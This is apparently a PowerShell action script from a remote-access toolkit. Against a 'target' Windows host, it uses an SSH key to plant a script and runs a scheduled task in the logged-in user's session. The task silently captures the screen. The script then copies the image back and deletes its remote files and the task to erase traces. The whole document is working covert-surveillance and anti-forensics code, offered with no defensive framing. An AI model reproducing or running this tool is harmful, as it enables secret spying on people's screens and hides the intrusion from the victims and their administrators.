# Type: Action
# Description: Captures a silent screenshot on the remote host inside the interactive session, SCPs it back locally, then removes all remote traces and logs.
param($Config, [array]$Arguments)

if (-not (Test-Connection -ComputerName $Config.IP -Count 1 -Quiet)) { Write-Host "[ABORT] Target offline." -ForegroundColor Yellow ; return }

$Stamp = Get-Date -Format "yyyyMMdd_HHmmss"
$RemoteName = "target_snap_$Stamp.png"
$RemoteDest = "C:\Users\Public\$RemoteName"
$Auth = "-i `"$($Config.Key)`""
$Target = "$($Config.User)@$($Config.IP)"
$LocalOut = if ($Arguments[0]) { $Arguments[0] } else { Join-Path $env:USERPROFILE "Documents\$RemoteName" }

& "$global:SharedToolkitPath\Actions\log.ps1" -Config $Config -Arguments @("Capturing remote screenshot to $LocalOut")

$ScriptName = "snap_$Stamp.ps1"
$RemoteScript = "C:\Users\Public\$ScriptName"
$Wrapper = @"
`$user = (Get-CimInstance Win32_ComputerSystem).UserName
`$rdest = '$RemoteDest'
`$cap = "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; `$b=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); `$g=[System.Drawing.Graphics]::FromImage(`$b); `$g.CopyFromScreen(0,0,0,0,`$b.Size); `$b.Save('$RemoteDest'); `$g.Dispose(); `$b.Dispose()"
`$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -Command `$cap"
`$principal = New-ScheduledTaskPrincipal -UserId `$user -LogonType Interactive
Register-ScheduledTask -TaskName "SNAP_$Stamp" -Action `$action -Principal `$principal -Force | Out-Null
Start-ScheduledTask -TaskName "SNAP_$Stamp"
Start-Sleep -Seconds 4
Unregister-ScheduledTask -TaskName "SNAP_$Stamp" -Confirm:`$false
"@
$LocalScript = Join-Path $env:TEMP $ScriptName
$Wrapper | Out-File $LocalScript -Force

& scp $Auth "$LocalScript" "${Target}:$RemoteScript"
Invoke-Expression "ssh -o ConnectTimeout=8 -o BatchMode=yes $Auth $Target `"powershell -NoProfile -ExecutionPolicy Bypass -File '$RemoteScript'`""
Start-Sleep -Seconds 1
& scp $Auth "${Target}:$RemoteDest" "$LocalOut"

Invoke-Expression "ssh -o ConnectTimeout=8 -o BatchMode=yes $Auth $Target `"powershell -NoProfile -Command 'if (Test-Path ''$RemoteScript'') { Remove-Item ''$RemoteScript'' -Force } ; if (Test-Path ''$RemoteDest'') { Remove-Item ''$RemoteDest'' -Force }'`""
Remove-Item $LocalScript -Force -ErrorAction SilentlyContinue

& "$global:SharedToolkitPath\Actions\log.ps1" -Config $Config -Arguments @("Screenshot saved locally to $LocalOut; remote traces erased.")
Write-Host "[DONE] Screenshot pulled to $LocalOut" -ForegroundColor Green
